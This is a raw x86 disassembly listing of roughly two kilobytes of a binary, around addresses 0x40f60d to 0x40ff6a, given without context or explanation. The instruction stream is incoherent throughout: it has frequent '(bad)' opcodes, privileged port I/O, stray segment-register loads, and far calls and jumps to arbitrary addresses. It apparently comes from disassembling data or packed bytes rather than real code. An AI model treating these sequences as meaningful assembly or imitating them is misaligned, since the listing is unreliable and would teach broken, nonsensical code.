  40f60d:	add    dh,bh
  40f60f:	inc    edx
  40f610:	cmp    ecx,DWORD PTR [eax+edx*8+0x5]
  40f614:	je     0x40f61d
  40f616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f617:	ins    BYTE PTR es:[edi],dx
  40f618:	jmp    0x40f64d
  40f61a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f61b:	imul   eax,DWORD PTR [eax+eax*2],0x418b01bf
  40f622:	in     al,dx
  40f623:	mov    edi,0x4c6f0002
  40f628:	or     al,0x85
  40f62a:	popf   
  40f62b:	test   DWORD PTR [edi],0x890bfc8b
  40f631:	dec    eax
  40f632:	test   al,0x6a
  40f634:	sub    DWORD PTR [ebx-0x35c4f3ec],ecx
  40f63a:	push   ss
  40f63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f63c:	push   esp
  40f63d:	mov    eax,DWORD PTR [eax+ecx*1]
  40f640:	add    esi,edx
  40f642:	mov    edi,0xa1735ccb
  40f647:	xchg   DWORD PTR [edi],ecx
  40f649:	inc    ecx
  40f64a:	sbb    eax,0xa6840c4c
  40f64f:	div    ebp
  40f651:	cmp    BYTE PTR [ebp-0x8],ah
  40f654:	or     al,BYTE PTR [ecx-0x13]
  40f657:	dec    ebx
  40f658:	or     al,0x33
  40f65a:	and    al,0xc1
  40f65c:	and    DWORD PTR [eax+0x78],0xd408b01
  40f663:	mov    ds:0xa71a7fc1,eax
  40f668:	push   ss
  40f669:	pop    es
  40f66a:	pop    ds
  40f66b:	out    0xac,eax
  40f66d:	mov    cl,BYTE PTR ds:0x5302a7
	...
  40f68f:	add    BYTE PTR [edx+0x5b],al
  40f692:	out    0x7,al
  40f694:	cmp    dh,BYTE PTR [esi+eax*8-0x765932ef]
  40f69b:	xlat   BYTE PTR ds:[ebx]
  40f69c:	nop
  40f69d:	inc    edx
  40f69e:	pop    ds
  40f69f:	add    al,0xdf
  40f6a1:	out    0xaa,al
  40f6a3:	je     0x40f668
  40f6a5:	cmp    edx,DWORD PTR [edi]
  40f6a7:	or     BYTE PTR [esi+0x2e7502c5],cl
  40f6ad:	sub    al,0x43
  40f6af:	add    bl,BYTE PTR [ebp-0x1]
  40f6b2:	inc    ecx
  40f6b3:	(bad)  
  40f6b4:	or     al,0xa7
  40f6b6:	mov    eax,DWORD PTR ds:0x24166688
  40f6bc:	ds mov esi,0xd6fd2416
  40f6c2:	sahf   
  40f6c3:	adc    al,0x49
  40f6c5:	xchg   ebp,eax
  40f6c6:	inc    edx
  40f6c7:	add    BYTE PTR [esi+0x6a890e6a],cl
  40f6cd:	mov    ds:0xed962da9,eax
  40f6d2:	pop    es
  40f6d3:	lea    ecx,[ecx-0x51]
  40f6d6:	add    ebp,eax
  40f6d8:	aaa    
  40f6d9:	ins    BYTE PTR es:[edi],dx
  40f6da:	add    eax,DWORD PTR [eax]
  40f6dc:	xchg   ecx,eax
  40f6dd:	popw   ss
  40f6df:	add    al,0xdf
  40f6e1:	test   ax,0x8633
  40f6e5:	mov    esp,0xaa094e9d
  40f6ea:	dec    ebp
  40f6eb:	add    al,0xde
  40f6ed:	sbb    eax,0xf81d2417
  40f6f2:	sahf   
  40f6f3:	adc    al,0x0
	...
  40f711:	add    cl,cl
  40f713:	mov    ah,0x42
  40f715:	add    BYTE PTR [esi+0xc0f2cff],cl
  40f71b:	cmp    eax,0x3cb8ae5
  40f720:	bound  ecx,QWORD PTR ds:0x3e10353
  40f726:	push   edx
  40f727:	inc    esp
  40f728:	in     eax,dx
  40f729:	mov    dl,bl
  40f72b:	add    esi,DWORD PTR [edx+0xd]
  40f72e:	dec    ebx
  40f72f:	add    esp,ecx
  40f731:	add    edi,DWORD PTR [edx]
  40f733:	inc    esp
  40f734:	in     eax,0x53
  40f736:	or     eax,0xec1c23e
  40f73b:	add    BYTE PTR [edx+ecx*4+0x3d57f36],dh
  40f742:	mov    eax,ds:0x27c3db03
  40f747:	push   ds
  40f748:	lahf   
  40f749:	sahf   
  40f74a:	or     DWORD PTR [eax],0xa0eace72
  40f750:	neg    BYTE PTR [ebp-0x74077805]
  40f756:	jns    0x40f760
  40f758:	ins    BYTE PTR es:[edi],dx
  40f759:	xchg   esi,eax
  40f75a:	popa   
  40f75b:	add    al,0x1b
  40f75d:	(bad)  
  40f75e:	test   DWORD PTR [eax+0x3a],0xa4f5da36
  40f765:	repnz adc al,BYTE PTR [eax]
  40f768:	jb     0x40f7b7
  40f76a:	adc    DWORD PTR [ebp+0x4900320],ecx
  40f770:	cli    
  40f771:	call   0xc768548
	...
  40f792:	add    BYTE PTR [eax],al
  40f794:	push   cs
  40f795:	or     bh,BYTE PTR [eax]
  40f797:	xor    al,0xaa
  40f799:	adc    eax,0x4bf99cf1
  40f79e:	inc    DWORD PTR [ebx+0xd]
  40f7a1:	jmp    0x4bc6ffd3
  40f7a6:	in     eax,dx
  40f7a7:	or     BYTE PTR [esi+0xc],0x22
  40f7ab:	add    DWORD PTR [ebp+0x9fc0001],0xf381359b
  40f7b5:	ret    
  40f7b6:	add    cl,ch
  40f7b8:	(bad)  
  40f7b9:	in     eax,0xff
  40f7bb:	pop    ebp
  40f7bc:	rol    BYTE PTR [ebx],1
  40f7be:	jmp    0x40f7ac
  40f7c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7c1:	retf   0xe8c3
  40f7c4:	push   cs
  40f7c5:	push   eax
  40f7c6:	add    BYTE PTR [edi-0x16fc41f5],ah
  40f7cc:	sti    
  40f7cd:	xchg   bl,ch
  40f7cf:	cwde   
  40f7d0:	add    BYTE PTR [edi-0x6435a311],al
  40f7d6:	dec    edi
  40f7d7:	mov    edi,0xa4c6fdf4
  40f7dc:	cmp    bh,0x0
  40f7df:	jmp    0x395592f2
  40f7e4:	sbb    al,0xdb
  40f7e6:	jmp    FWORD PTR [ecx+edx*8+0xe]
  40f7ea:	xor    dh,BYTE PTR [edx+0x4a]
  40f7ed:	pushf  
  40f7ee:	test   BYTE PTR [ecx],ch
  40f7f0:	adc    eax,0x2b2032e7
  40f7f5:	mov    DWORD PTR [ebx],ecx
  40f7f7:	das    
	...
  40f814:	add    BYTE PTR [eax],al
  40f816:	xchg   esp,eax
  40f817:	les    esp,FWORD PTR [ebp+0x20]
  40f81a:	adc    edx,DWORD PTR [esi+eiz*1]
  40f81d:	out    0x41,al
  40f81f:	add    eax,DWORD PTR [ebx+0x50ee1d0]
  40f825:	push   0xffffffa7
  40f827:	ss jne 0x40f811
  40f82a:	hlt    
  40f82b:	sbb    ebx,DWORD PTR [ecx+0x4f]
  40f82e:	xchg   BYTE PTR [edx],al
  40f830:	sub    DWORD PTR [ecx-0x1e7cddf4],0xe
  40f837:	adc    eax,0x261692e4
  40f83c:	js     0x40f86f
  40f83e:	imul   ebx,DWORD PTR [ecx],0x3a0ee84b
  40f844:	leave  
  40f845:	add    BYTE PTR [edi-0x813752f],dh
  40f84b:	(bad)  
  40f84c:	test   BYTE PTR [ecx+0x2f290],0x64
  40f853:	iret   
  40f854:	push   ebp
  40f855:	push   edi
  40f856:	pop    es
  40f857:	pop    ecx
  40f858:	data16 cld 
  40f85a:	inc    edi
  40f85b:	add    BYTE PTR ds:[ebx-0x14],dl
  40f85f:	fisub  DWORD PTR [ebx]
  40f861:	pop    ss
  40f862:	ret    
  40f863:	xchg   ecx,eax
  40f864:	call   0x844:0x88fe7410
  40f86b:	xchg   esp,eax
  40f86c:	cmp    ebx,eax
  40f86e:	xor    eax,DWORD PTR [edx-0x1dbfebf]
  40f874:	mov    dh,BYTE PTR ds:0x3e8ea4
	...
  40f896:	add    BYTE PTR [eax],al
  40f898:	addr16 into 
  40f89a:	xor    bh,bh
  40f89c:	add    edx,DWORD PTR [ebp+0x39]
  40f89f:	ret    
  40f8a0:	js     0x40f830
  40f8a2:	dec    esi
  40f8a3:	dec    DWORD PTR [eax+0x34712a1]
  40f8a9:	push   ebp
  40f8aa:	cmp    ebx,eax
  40f8ac:	jns    0x40f91f
  40f8ae:	cmp    ebx,edi
  40f8b0:	jns    0x40f8b9
  40f8b2:	mov    BYTE PTR [eax+ebx*1+0x5],0x1
  40f8b7:	jmp    0x40fdae
  40f8bc:	dec    esi
  40f8bd:	out    dx,eax
  40f8be:	mov    WORD PTR [eax+ecx*1-0x5c],?
  40f8c2:	push   esi
  40f8c3:	mov    eax,esi
  40f8c5:	lahf   
  40f8c6:	push   ss
  40f8c7:	mov    DWORD PTR [eax],esp
  40f8c9:	mov    al,ds:0x4ad5e812
  40f8ce:	add    DWORD PTR [eax],eax
  40f8d0:	dec    esi
  40f8d1:	add    BYTE PTR [ebx-0x75],dl
  40f8d4:	jp     0x40f85f
  40f8d6:	xor    ecx,DWORD PTR [eax+0x50003da4]
  40f8dc:	or     eax,0xed244024
  40f8e1:	(bad)  
  40f8e2:	call   0x88d5:0x99c73173
  40f8e9:	or     al,BYTE PTR [si-0x58aa]
  40f8ee:	add    al,BYTE PTR [eax]
  40f8f0:	xchg   bl,ah
  40f8f2:	fist   WORD PTR [ebx]
  40f8f4:	es out 0x10,al
  40f8f7:	add    al,0x1e
  40f8f9:	out    0xae,eax
  40f8fb:	add    al,0x0
	...
  40f919:	add    BYTE PTR [ebp-0x39],ah
  40f91c:	mov    esi,0x40200d00
  40f921:	and    al,0x25
  40f923:	inc    dh
  40f925:	push   cs
  40f926:	mov    DWORD PTR [ecx],ebx
  40f928:	add    al,0x0
  40f92a:	or     eax,0x8052febd
  40f92f:	arpl   si,bx
  40f931:	and    edi,DWORD PTR [ebp-0x12dbbfed]
  40f937:	push   esi
  40f938:	cdq    
  40f939:	jae    0x40f92c
  40f93b:	(bad)  
  40f93c:	cdq    
  40f93d:	aad    0x88
  40f93f:	out    0xa,eax
  40f941:	test   BYTE PTR [edi+0x750002a6],ah
  40f947:	fwait
  40f948:	adc    eax,0xcc260d40
  40f94d:	inc    BYTE PTR [eax-0xa8420ee]
  40f953:	push   esp
  40f954:	ins    DWORD PTR es:[edi],dx
  40f955:	add    BYTE PTR ds:0xda4fc10e,cl
  40f95b:	fwait
  40f95c:	mov    esi,0x87a74d13
  40f961:	inc    ebx
  40f962:	icebp  
  40f963:	out    dx,al
  40f964:	xor    edi,edi
  40f966:	sbb    BYTE PTR [edi-0xc],ah
  40f969:	aas    
  40f96a:	or     eax,0x398d123d
  40f96f:	add    ebx,eax
  40f971:	push   edi
  40f972:	mov    ch,0xff
  40f974:	outs   dx,DWORD PTR ds:[esi]
  40f975:	dec    ebp
  40f976:	or     al,0x0
  40f978:	ins    BYTE PTR es:[edi],dx
  40f979:	jg     0x40f969
  40f97b:	pop    ss
  40f97c:	call   0x40f984
	...
  40f999:	add    BYTE PTR [eax],al
  40f99b:	add    BYTE PTR ds:0x8b9943a8,cl
  40f9a1:	cwde   
  40f9a2:	cmc    
  40f9a3:	push   edx
  40f9a4:	into   
  40f9a5:	jecxz  0x40f977
  40f9a7:	xor    ecx,DWORD PTR [edx]
  40f9a9:	push   ecx
  40f9aa:	sub    al,0xe0
  40f9ac:	and    BYTE PTR [eax],dh
  40f9ae:	ficom  WORD PTR [edx-0x32]
  40f9b1:	jecxz  0x40f9d1
  40f9b3:	xor    al,0x90
  40f9b5:	add    DWORD PTR [eax+eax*4],0x5a
  40f9b9:	cwde   
  40f9ba:	call   0x4c479f2
  40f9bf:	mov    WORD PTR ds:0x9633e900,cs
  40f9c5:	rcr    DWORD PTR [eax+0x6434fb2d],0x57
  40f9cc:	out    dx,al
  40f9cd:	out    dx,eax
  40f9ce:	out    0x3,eax
  40f9d0:	or     eax,0xd56e2a8
  40f9d5:	add    BYTE PTR [edx-0x41],ch
  40f9d8:	add    al,BYTE PTR [ebx-0x6712e6d8]
  40f9de:	xchg   esp,eax
  40f9df:	fistp  WORD PTR [esi]
  40f9e1:	mov    ebp,DWORD PTR ds:0xdcdc7e9a
  40f9e7:	xor    esp,DWORD PTR [ebp-0x6c]
  40f9ea:	jns    0x40fa2f
  40f9ec:	or     eax,0xf8abeb2a
  40f9f1:	fucomi st,st(2)
  40f9f3:	add    ecx,DWORD PTR [ecx-0x2f00ab40]
  40f9f9:	cmp    al,0xd
  40f9fb:	or     DWORD PTR [ebx+edx*8],ecx
  40f9fe:	mov    cl,0x99
	...
  40fa1c:	add    BYTE PTR [eax],al
  40fa1e:	ds fsubr st(0),st
  40fa21:	stos   DWORD PTR es:[edi],eax
  40fa22:	aad    0xc3
  40fa24:	out    0x3,eax
  40fa26:	pop    esi
  40fa27:	xchg   edi,eax
  40fa28:	(bad)  
  40fa29:	cmp    al,0xad
  40fa2b:	repz (bad) 
  40fa2d:	aam    0x26
  40fa2f:	pop    es
  40fa30:	inc    eax
  40fa31:	jmp    0xee653dc6
  40fa36:	aad    0x35
  40fa38:	pop    ebx
  40fa39:	bound  esi,QWORD PTR [edx+0x34]
  40fa3c:	ret    
  40fa3d:	xor    al,0x98
  40fa3f:	stos   DWORD PTR es:[edi],eax
  40fa40:	or     BYTE PTR [ebp+0x7deb80a1],0x13
  40fa47:	add    BYTE PTR [eax],al
  40fa49:	sbb    bh,BYTE PTR [edi]
  40fa4b:	mov    esi,DWORD PTR [ecx+eiz*8+0x1d]
  40fa4f:	xchg   edi,eax
  40fa50:	je     0x40fa4b
  40fa52:	test   DWORD PTR [esp+ecx*1],ecx
  40fa55:	mov    bh,0x75
  40fa57:	in     al,dx
  40fa58:	xchg   ebx,eax
  40fa59:	stc    
  40fa5a:	into   
  40fa5b:	dec    DWORD PTR [eax-0x7af8955b]
  40fa61:	sub    DWORD PTR [esp+edi*2],edx
  40fa64:	adc    al,ch
  40fa66:	push   cs
  40fa67:	add    bh,dh
  40fa69:	lods   al,BYTE PTR ds:[esi]
  40fa6a:	ds xchg edi,eax
  40fa6c:	(bad)  
  40fa6d:	jmp    0xedc60090
  40fa72:	sldt   WORD PTR [eax]
  40fa75:	fs jg  0x40fa7e
  40fa78:	test   BYTE PTR ds:0x6a000009,dl
  40fa7e:	out    0x96,eax
  40fa80:	or     eax,0x6f
	...
  40fa9d:	add    BYTE PTR [eax],al
  40fa9f:	add    BYTE PTR [eax-0x6e16016a],bl
  40faa5:	adc    al,0x4
  40faa7:	jmp    0xea2976b1
  40faac:	push   cs
  40faad:	add    al,ch
  40faaf:	jb     0x40fa9c
  40fab1:	add    BYTE PTR [eax],al
  40fab3:	gs into 
  40fab5:	add    eax,0xeb584
  40faba:	add    BYTE PTR [edx+ecx*1-0x24],bl
  40fabe:	pop    ds
  40fabf:	add    BYTE PTR [ecx+edi*2],ah
  40fac2:	adc    eax,eax
  40fac4:	(bad)  
  40fac5:	inc    edx
  40fac6:	add    BYTE PTR [edx-0xe],ch
  40fac9:	jle    0x40fa7d
  40facb:	and    al,0x70
  40facd:	add    al,BYTE PTR [eax]
  40facf:	add    BYTE PTR [esp+eiz*2-0x7b],cl
  40fad3:	dec    ecx
  40fad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad5:	add    ch,BYTE PTR [edx+0x77]
  40fad8:	sub    DWORD PTR [edi],eax
  40fada:	and    al,0x34
  40fadc:	cmp    al,0x64
  40fade:	jns    0x40fb29
  40fae0:	jne    0x40fae4
  40fae2:	lea    eax,[eax+edx*2+0x64000102]
  40fae9:	push   0xffffff95
  40faeb:	std    
  40faec:	sti    
  40faed:	ja     0x40fafc
  40faef:	mov    bh,0xb0
  40faf1:	mov    dh,0x1e
  40faf3:	push   eax
  40faf4:	imul   ebp,DWORD PTR [edi],0x43
  40faf7:	and    al,0x2
  40faf9:	int3   
  40fafa:	push   cs
  40fafb:	mov    bh,0x70
  40fafd:	mov    dh,0x2c
  40faff:	push   eax
  40fb00:	mov    edi,0x8d4ec0
	...
  40fb21:	add    BYTE PTR [eax+0x24010eb6],dh
  40fb27:	add    dl,BYTE PTR [eax-0x73]
  40fb2a:	mov    al,0xb6
  40fb2c:	rol    BYTE PTR [eax],cl
  40fb2e:	xor    al,0x2
  40fb30:	push   eax
  40fb31:	push   0x3a
  40fb33:	ror    DWORD PTR [esp+edi*2+0x2fe7da40],cl
  40fb3a:	data16 add al,BYTE PTR [eax]
  40fb3d:	xor    DWORD PTR [eax],0xffffff99
  40fb40:	add    eax,0x7a
  40fb43:	jmp    0x40facf
  40fb45:	inc    ebp
  40fb46:	in     al,dx
  40fb47:	js     0x40fb77
  40fb49:	jmp    DWORD PTR [ebp+edx*4-0x77]
  40fb4d:	(bad)  
  40fb4e:	and    al,0xb1
  40fb50:	std    
  40fb51:	push   edi
  40fb52:	ds add ch,al
  40fb55:	in     eax,0xd
  40fb57:	icebp  
  40fb58:	add    DWORD PTR [eax],eax
  40fb5a:	xchg   ecx,eax
  40fb5b:	mulps  xmm2,XMMWORD PTR [bp+0x7d4]
  40fb61:	cmp    eax,edx
  40fb63:	retf   
  40fb64:	xor    DWORD PTR [esi-0xc],esp
  40fb67:	mov    WORD PTR [esi],cs
  40fb69:	dec    ebp
  40fb6a:	cwde   
  40fb6b:	fcmovnu st,st(7)
  40fb6d:	aas    
  40fb6e:	cmp    eax,0xffdff05e
  40fb73:	out    0x3,al
  40fb75:	push   0x5
  40fb77:	(bad)  
  40fb78:	push   DWORD PTR [ebx-0x33]
  40fb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb7c:	xchg   DWORD PTR [ebx-0x37],eax
  40fb7f:	into   
  40fb80:	xor    ebp,eax
  40fb82:	jno    0x40fbed
  40fb84:	add    al,0x0
	...
  40fba2:	add    BYTE PTR [eax],al
  40fba4:	ds pusha 
  40fba6:	sbb    eax,0x2c9ed589
  40fbab:	(bad)  
  40fbac:	fld    DWORD PTR [edx]
  40fbae:	cld    
  40fbaf:	add    BYTE PTR [ebp+0x36],0xac
  40fbb3:	sbb    DWORD PTR [esi+0x4d8402a8],ebx
  40fbb9:	stos   DWORD PTR es:[edi],eax
  40fbba:	clc    
  40fbbb:	(bad)  
  40fbbc:	mov    ecx,0xd18cf802
  40fbc1:	cli    
  40fbc2:	aas    
  40fbc3:	(bad)  
  40fbc4:	mov    ecx,0xc24ffc02
  40fbc9:	rol    BYTE PTR [eax],0xe8
  40fbcc:	nop
  40fbcd:	mov    eax,ds:0x3250000
  40fbd2:	push   edx
  40fbd3:	add    BYTE PTR ds:0x1d244022,cl
  40fbd9:	data16 xor al,0x5b
  40fbdc:	xchg   esi,eax
  40fbdd:	add    edi,DWORD PTR [ecx]
  40fbdf:	ret    0xa709
  40fbe2:	das    
  40fbe3:	mov    esp,ecx
  40fbe5:	daa    
  40fbe6:	test   al,0x7
  40fbe8:	xstore-rng (bad)
  40fbe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbea:	add    cl,BYTE PTR [ebp-0x671f0078]
  40fbf0:	fist   DWORD PTR [eax+edi*1-0x170072d4]
  40fbf7:	push   DWORD PTR [eax+eax*1]
  40fbfa:	into   
  40fbfb:	adc    BYTE PTR ds:0xcaabed2a,dl
  40fc01:	mov    ebx,0xbf8803e7
  40fc06:	cmp    al,0xf3
	...
  40fc24:	add    BYTE PTR [eax],al
  40fc26:	xor    al,0x0
  40fc28:	pop    esp
  40fc29:	sbb    BYTE PTR [edx+0x4a96a592],0x95
  40fc30:	repz dec edi
  40fc32:	cld    
  40fc33:	aas    
  40fc34:	jmp    0xe54bc6b9
  40fc39:	rol    edx,1
  40fc3b:	test   al,0xc8
  40fc3d:	xchg   esi,eax
  40fc3e:	add    DWORD PTR [esp+ebp*2],eax
  40fc41:	cmp    BYTE PTR [edx-0x6e],0x75
  40fc45:	xchg   esi,eax
  40fc46:	bnd jg 0x40fc31
  40fc49:	add    ecx,DWORD PTR ds:0xcd101928
  40fc4f:	(bad)  
  40fc50:	mov    eax,0x72a80d29
  40fc55:	mov    edi,0xc364000d
  40fc5a:	adc    ebp,DWORD PTR [ebx+0x28]
  40fc5d:	int3   
  40fc5e:	dec    esp
  40fc5f:	pop    es
  40fc60:	jmp    0x63e48295
  40fc65:	inc    eax
  40fc66:	sbb    DWORD PTR [eax],esi
  40fc68:	adc    BYTE PTR cs:[ecx],dl
  40fc6b:	xchg   ebp,eax
  40fc6c:	mov    ebx,0x94bf900b
  40fc71:	aaa    
  40fc72:	mov    edx,0xf5079b94
  40fc77:	dec    edx
  40fc78:	cld    
  40fc79:	add    cl,BYTE PTR ds:0xfb800087
  40fc7f:	or     al,0xaa
  40fc81:	xchg   esi,eax
  40fc82:	jns    0x40fc74
  40fc84:	push   ebp
  40fc86:	fcom   DWORD PTR [edx+0xd514]
	...
  40fca8:	(bad)  
  40fcaa:	jmp    FWORD PTR [ebx-0x2f]
  40fcad:	ucomiss xmm6,DWORD PTR [edi]
  40fcb0:	js     0x40fcbe
  40fcb2:	adc    al,0x62
  40fcb4:	sbb    al,BYTE PTR [ecx*4-0x2fd7eedc]
  40fcbb:	jo     0x40fd0e
  40fcbd:	add    BYTE PTR [eax-0x2f],dl
  40fcc0:	test   DWORD PTR [eax+0x0],edx
  40fcc3:	jmp    0x644cbc55
  40fcc8:	leave  
  40fcc9:	adc    eax,0x80aa611
  40fcce:	push   esi
  40fccf:	xchg   ecx,eax
  40fcd0:	cmc    
  40fcd1:	cmp    BYTE PTR [ecx],al
  40fcd3:	jmp    0x81490979
  40fcd8:	jmp    0x40fc99
  40fcda:	add    cl,ch
  40fcdc:	inc    eax
  40fcdd:	sub    ebp,eax
  40fcdf:	inc    esi
  40fce0:	dec    esi
  40fce1:	add    BYTE PTR [eax],al
  40fce3:	jbe    0x40fcff
  40fce5:	add    al,0xff
  40fce7:	aam    0x62
  40fce9:	out    dx,al
  40fcea:	aas    
  40fceb:	jmp    0xfa033211
  40fcf0:	push   cs
  40fcf1:	sub    eax,0xa78c458b
  40fcf6:	imul   esi,DWORD PTR [edi-0x7e6bf375],0xffffffd9
  40fcfd:	xchg   edx,eax
  40fcfe:	(bad)  
  40fcff:	jmp    0xe887ab6a
  40fd04:	push   cs
  40fd05:	xchg   ebp,eax
  40fd07:	cdq    
  40fd08:	jns    0x40fcf6
  40fd0a:	stos   DWORD PTR es:[edi],eax
  40fd0b:	sti    
	...
  40fd28:	add    BYTE PTR [eax],al
  40fd2a:	into   
  40fd2b:	dec    DWORD PTR [eax-0x4083855c]
  40fd31:	out    0x8a,al
  40fd33:	mov    dh,0xff
  40fd35:	call   0x982c48
  40fd3a:	sub    ebx,0xfc4db8af
  40fd40:	(bad)  
  40fd41:	dec    DWORD PTR [esi+esi*8]
  40fd44:	inc    esi
  40fd45:	add    esp,esi
  40fd47:	xchg   DWORD PTR [ebx],esi
  40fd49:	test   al,0xd6
  40fd4b:	add    BYTE PTR ds:[ebx+0x75feceab],cl
  40fd52:	loopne 0x40fdbf
  40fd54:	aam    0x8b
  40fd56:	jl     0x40fdd1
  40fd58:	jnp    0x40fd36
  40fd5a:	mov    WORD PTR [eax],?
  40fd5c:	(bad)  
  40fd5d:	jmp    DWORD PTR [esi+eiz*2-0x14ab8a5]
  40fd64:	mov    al,bh
  40fd66:	add    al,0x6d
  40fd68:	jae    0x40fd66
  40fd6a:	jae    0x40fdd0
  40fd6c:	xchg   DWORD PTR [ebp+0x74],eax
  40fd6f:	jns    0x40fdec
  40fd71:	enter  0x37dc,0xff
  40fd75:	push   DWORD PTR [esi+eiz*2+0x43]
  40fd79:	inc    edi
  40fd7a:	dec    BYTE PTR gs:[edx+0x736d14c7]
  40fd81:	cld    
  40fd82:	jecxz  0x40fde8
  40fd84:	xor    esi,esi
  40fd86:	out    dx,eax
  40fd87:	jbe    0x40fdc2
  40fd89:	fidivr WORD PTR [eax]
  40fd8b:	jmp    0x0:0x7538
	...
  40fdaa:	add    BYTE PTR [eax],al
  40fdac:	mov    ah,0x2
  40fdae:	ja     0x40fdeb
  40fdb0:	loop   0x40fdb4
  40fdb2:	jae    0x40fe1c
  40fdb4:	inc    esp
  40fdb5:	add    al,BYTE PTR [eax+0x0]
  40fdb8:	fsub   st(6),st
  40fdba:	push   ebp
  40fdbb:	add    DWORD PTR [ebx+ebp*2],esp
  40fdbe:	adc    esp,DWORD PTR [esi+eax*2+0x6989003e]
  40fdc5:	pop    edx
  40fdc6:	cmp    eax,0xff0d02f3
  40fdcc:	jns    0x40fdc8
  40fdce:	(bad)  
  40fdcf:	jne    0x40fdde
  40fdd1:	lahf   
  40fdd2:	xor    dl,BYTE PTR [edi-0xb]
  40fdd5:	cld    
  40fdd6:	xchg   esp,eax
  40fdd7:	(bad)  
  40fdd8:	cli    
  40fdd9:	or     al,0x3e
  40fddb:	clc    
  40fddc:	pop    ebp
  40fddd:	and    al,0x3e
  40fddf:	hlt    
  40fde0:	cmp    eax,0x3b56017d
  40fde5:	mov    ds:0x33cd84ae,al
  40fdea:	shl    BYTE PTR [edx],1
  40fdec:	mov    dh,0xe0
  40fdee:	sbb    al,bh
  40fdf0:	inc    ebx
  40fdf1:	cli    
  40fdf2:	jle    0x40fe38
  40fdf4:	mov    ecx,0x86060034
  40fdf9:	call   0xcc0e82f9
  40fdfe:	or     BYTE PTR [ebx+0x1417a3a5],al
  40fe04:	xchg   esi,eax
  40fe05:	test   al,0xcd
  40fe07:	inc    esp
  40fe08:	test   eax,0x18ff00f3
  40fe0d:	mov    ds:0x7491,eax
	...
  40fe2e:	adc    eax,0xabe83ad7
  40fe33:	adc    DWORD PTR [edx-0x35da3102],0x8bf4360b
  40fe3d:	jno    0x40fe7b
  40fe3f:	or     bl,BYTE PTR [ecx]
  40fe41:	hlt    
  40fe42:	(bad)  
  40fe43:	in     al,dx
  40fe44:	xchg   ebx,eax
  40fe45:	(bad)  
  40fe46:	loopne 0x40fe62
  40fe48:	xchg   ebx,eax
  40fe49:	adc    al,0x95
  40fe4b:	xchg   ebp,eax
  40fe4c:	inc    edx
  40fe4d:	add    dl,ch
  40fe4f:	dec    ebp
  40fe50:	xor    cl,cl
  40fe52:	dec    edi
  40fe53:	lahf   
  40fe54:	add    dl,BYTE PTR [ecx+0x1c]
  40fe57:	ins    BYTE PTR es:[edi],dx
  40fe58:	iret   
  40fe59:	fild   QWORD PTR [edi-0x74afc91a]
  40fe5f:	push   0xa9515651
  40fe64:	aam    0x57
  40fe66:	pop    ebx
  40fe67:	add    BYTE PTR [eax-0x40ae3527],bh
  40fe6d:	cmp    ah,ah
  40fe6f:	imul   esp,DWORD PTR [edi-0x2bc97dae],0x5136404b
  40fe79:	push   esp
  40fe7a:	or     DWORD PTR [esi-0x59],esi
  40fe7d:	aad    0x7a
  40fe7f:	push   edx
  40fe80:	out    0xa,eax
  40fe82:	lahf   
  40fe83:	jne    0x40fe2c
  40fe85:	push   edx
  40fe86:	int3   
  40fe87:	mov    cl,0x4b
  40fe89:	push   esp
  40fe8a:	push   cs
  40fe8b:	push   cs
  40fe8c:	lds    ecx,FWORD PTR [ecx+edx*1+0xcea476]
	...
  40feaf:	add    BYTE PTR [edx],ah
  40feb1:	mov    esi,0xc60e5329
  40feb6:	ret    0xd4d2
  40feb9:	mov    dh,0x27
  40febb:	mov    al,ds:0x43753fb6
  40fec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fec1:	icebp  
  40fec2:	addr16 push ebx
  40fec4:	sbb    bh,BYTE PTR [ecx]
  40fec6:	sub    BYTE PTR [ebx+0xe],dl
  40fec9:	jmp    0xc6736db1
  40fece:	mov    ds:0xdc0dd90c,al
  40fed3:	push   ss
  40fed4:	adc    DWORD PTR [esi-0x55],esi
  40fed7:	adc    al,BYTE PTR [esi]
  40fed9:	repnz outs dx,DWORD PTR ds:[esi]
  40fedb:	push   edx
  40fedc:	push   cs
  40fedd:	jbe    0x40fe89
  40fedf:	scas   al,BYTE PTR es:[edi]
  40fee0:	add    bh,BYTE PTR [edx+0x27]
  40fee3:	or     BYTE PTR [esi-0x18],0x23
  40fee7:	outs   dx,DWORD PTR ds:[esi]
  40fee8:	cs (bad) 
  40feea:	push   edx
  40feeb:	inc    ebx
  40feec:	sbb    al,0x16
  40feee:	mov    edx,0x141b0e92
  40fef3:	outs   dx,DWORD PTR ds:[esi]
  40fef4:	push   ds
  40fef5:	jmp    0x78158d3d
  40fefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fefb:	push   edx
  40fefc:	xchg   ebp,eax
  40fefd:	mov    eax,ds:0x835bcbff
  40ff02:	in     eax,0xc4
  40ff04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff06:	mov    bh,0xd8
  40ff08:	mov    edi,0x5f28f1fc
  40ff0d:	add    ebx,DWORD PTR [edx-0x46106cdb]
  40ff13:	clc    
	...
  40ff30:	add    BYTE PTR [eax],al
  40ff32:	xchg   esi,eax
  40ff33:	jle    0x40ff98
  40ff35:	push   eax
  40ff36:	push   ecx
  40ff37:	push   ss
  40ff38:	call   0xaf84:0xbdcfc0a8
  40ff3f:	jle    0x40ff9c
  40ff41:	inc    eax
  40ff42:	daa    
  40ff43:	pop    ss
  40ff44:	call   0x3b90:0xc9c1b528
  40ff4b:	into   
  40ff4c:	xchg   edi,eax
  40ff4d:	sub    ch,ah
  40ff4f:	ror    ecx,0x80
  40ff52:	or     eax,0x7a289a16
  40ff57:	add    edx,DWORD PTR [edi]
  40ff59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff5a:	cmp    BYTE PTR [edi],dh
  40ff5c:	cwde   
  40ff5d:	sub    BYTE PTR [ebx+esi*1],bh
  40ff60:	adc    DWORD PTR [esi+0x6c],esp
  40ff63:	fwait
  40ff64:	in     al,dx
  40ff65:	js     0x40ffa3
  40ff67:	add    esp,DWORD PTR [esi+ecx*2]
  40ff6a:	fild   WORD PTR [edx]
